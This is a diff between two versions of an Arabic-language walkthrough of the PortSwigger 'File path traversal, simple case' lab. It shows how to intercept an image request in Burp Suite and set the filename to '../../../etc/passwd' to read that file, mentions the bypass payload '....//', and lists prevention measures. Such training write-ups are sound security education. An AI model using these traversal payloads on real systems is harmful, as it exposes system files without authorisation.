@@ -1,48 +1,53 @@
 # Lab: File path traversal, simple case
 
-> **Category:** [Path Traversal](https://github.com/AliAlMansorisec/OWASP-Top-10-2025/blob/main/A01%20-%20Broken%20Access%20Control/02-Path-Traversal.md)
-> **Difficulty:** Apprentice
-> **Lab Link:** [PortSwigger Lab Page](https://portswigger.net/web-security/file-path-traversal/lab-simple)
+> **Category:** Path Traversal  
+> **Difficulty:** APPRENTICE  
+> **Lab Link:** [PortSwigger Lab - File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
 
 ---
 
 ## 🎯 الهدف الرئيسي
 
-استغلال ثغرة Path Traversal في عرض صور المنتج لقراءة محتوى ملف `/etc/passwd` من السيرفر.
+استغلال ثغرة Path Traversal في عرض صور المنتجات لقراءة محتوى ملف `/etc/passwd` من الخادم.
 
 ---
 
 ## 📝 الحل خطوة بخطوة
 
-### الخطوة 1: فتح المختبر
+### الخطوة 1: الدخول إلى المختبر
 
-- اضغط **Access the lab** عشان يفتح لك موقع وهمي للتجربة
-- أو افتح الرابط مباشرة: [PortSwigger Lab](https://portswigger.net/web-security/file-path-traversal/lab-simple)
-  
-### الخطوة 2: تشغيل Burp Suite
+- اضغط **Access the lab** لفتح موقع المتجر الوهمي.
+- ستظهر صفحة تعرض منتجات مختلفة مع صورها.
 
-- افتح Burp Suite
-- تأكد أن الـ Proxy شغال (Intercept is on)
+### الخطوة 2: تشغيل Burp Suite واعتراض الطلب
 
-### الخطوة 3: اعتراض طلب الصورة
+- افتح Burp Suite وتأكد من تشغيل الـ Proxy (Intercept on).
+- في المتصفح، اضغط على أي منتج لعرض صورته.
+- في Burp → **Proxy > HTTP history**، ابحث عن الطلب التالي:
 
-- في الموقع، حاول تشوف أي صورة منتج
-- اعترض الطلب في Burp
-
-ستجد طلب مشابه لهذا:
 ```http
-GET /image?filename=product.jpg HTTP/1.1
+GET /image?filename=product1.jpg HTTP/1.1
 Host: vulnerable-website.com
 ```
 
-### الخطوة 4: تعديل الـ filename parameter
+### الخطوة 3: إرسال الطلب إلى Repeater
 
-غير قيمة `filename` إلى:
+- حدد الطلب بزر الماوس الأيمن.
+- اختر **Send to Repeater**.
+
+### الخطوة 4: تعديل معامل filename
+
+في Repeater، غيّر قيمة `filename` من:
+```
+product1.jpg
+```
+إلى:
 ```
 ../../../etc/passwd
 ```
 
-يصبح الطلب كذا:
+يصبح الطلب:
+
 ```http
 GET /image?filename=../../../etc/passwd HTTP/1.1
 Host: vulnerable-website.com
@@ -50,55 +55,46 @@ Host: vulnerable-website.com
 
 ### الخطوة 5: إرسال الطلب
 
-- اضغط **Forward** في Burp
-- أو أرسل الطلب إلى Repeater (زر الماوس الأيمن → Send to Repeater) ثم اضغط **Send**
+- اضغط على **Send** في Repeater.
+- انظر إلى نافذة **Response**.
 
 ### الخطوة 6: مشاهدة النتيجة
 
-في الـ Response، سترى محتوى ملف `/etc/passwd`:
+ستظهر استجابة تحتوي على محتوى ملف `/etc/passwd`:
 
 ```text
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
 ...
 carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
 ```
 
 ### الخطوة 7: حل المختبر
 
-- ارجع إلى صفحة المختبر في المتصفح
-- لما تظهر لك محتويات `/etc/passwd`، المختبر يحل نفسه تلقائياً
-- راح تشوف رسالة **"Congratulations, you solved the lab!"**
+- بمجرد ظهور محتوى `/etc/passwd` في الرد، **تم حل المختبر تلقائيًا**.
+- ارجع إلى صفحة المختبر في المتصفح، ستظهر رسالة **"Congratulations, you solved the lab!"** وسيتغير لون المختبر إلى الأخضر.
 
 ---
 
 ## 🔑 ملاحظات مهمة
 
-- **لماذا نجح هذا؟**  
-  لأن الموقع ياخذ اسم الملف من المستخدم ويدمجه مع المسار بدون تحقق:  
-  `/var/www/images/` + `../../../etc/passwd` = `/var/www/images/../../../etc/passwd`  
-  السيرفر يتصفح للخارج من مجلد `images` حتى يصل إلى جذر النظام ثم يدخل إلى `/etc/passwd`
-
-- **ماذا يعني `../`؟**  
-  يعني "اخرج من المجلد الحالي ورجع خطوة للوراء"
-
-- **كم عدد `../` نحتاج؟**  
-  نحتاج عدد كافي عشان نخرج من مجلد الصور إلى جذر النظام.  
-  في أغلب الحالات، 3 مرات تكفي: `../../../`
-
-- **ماذا لو ما اشتغل؟**  
-  جرب تزيد عدد `../` (مثل 4 أو 5) أو تجرب `....//` (لتجاوز الفلاتر)
+| النقطة | الشرح |
+|--------|-------|
+| **لماذا نجح هذا؟** | الخادم يدمج مسار المجلد (`/var/www/images/`) مع اسم الملف الذي أدخلناه (`../../../etc/passwd`) بدون أي تحقق، فيصبح المسار النهائي `/var/www/images/../../../etc/passwd` والذي يكافئ `/etc/passwd`. |
+| **ماذا يعني `../`؟** | يعني "اخرج من المجلد الحالي ورجع خطوة واحدة للوراء". |
+| **كم عدد `../` نحتاج؟** | نحتاج عدد كافٍ للخروج من مجلد الصور إلى جذر النظام. في هذا المختبر، 3 مرات تكفي (`../../../`). |
+| **ماذا لو لم يشتغل؟** | جرب زيادة عدد `../` (مثل 4 أو 5) أو تجربة بايلودات أخرى مثل `....//` لتجاوز الفلاتر. |
 
 ---
 
-
 ## 🛡️ كيفية الوقاية (How to Prevent)
 
-- **استخدام قائمة بيضاء (Whitelist):** حدد أسماء الملفات المسموحة بدلاً من المسارات الديناميكية
-- **تنقية المدخلات:** ارفض أي مدخلات تحتوي على `../` أو `..\` أو `%2e%2e`
-- **استخدام مسارات ثابتة:** استخدم معرفات رقمية مرتبطة بمسارات ثابتة بدل اسم الملف
-- **تهيئة السيرفر:** عطل الوصول للملفات الحساسة عبر إعدادات السيرفر
+1. **استخدام قائمة بيضاء (Whitelist):** حدد أسماء الملفات المسموحة بدلاً من استخدام مسارات ديناميكية من المستخدم.
+2. **تنقية المدخلات (Input Sanitization):** ارفض أي مدخلات تحتوي على `../` أو `..\` أو `%2e%2e`.
+3. **استخدام مسارات ثابتة:** استخدم معرفات رقمية (IDs) مرتبطة بمسارات ثابتة بدلاً من اسم الملف مباشرة.
+4. **تهيئة السيرفر:** عطل الوصول إلى الملفات الحساسة عبر إعدادات السيرفر.
 
 ---
 
@@ -106,4 +102,3 @@ carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
 
 - [PortSwigger Lab Page](https://portswigger.net/web-security/file-path-traversal/lab-simple)
 - [Path Traversal Cheat Sheet](https://portswigger.net/web-security/file-path-traversal)
-
